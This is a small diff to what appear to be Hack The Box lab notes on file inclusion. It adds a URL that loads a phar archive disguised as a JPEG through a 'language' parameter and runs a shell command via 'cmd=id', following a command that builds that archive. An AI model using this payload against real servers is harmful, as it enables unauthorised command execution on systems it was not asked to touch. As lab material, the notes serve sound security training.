@@ -50,3 +50,6 @@ $phar->stopBuffering();
 ```
 [/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 ```
+```
+http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
+```
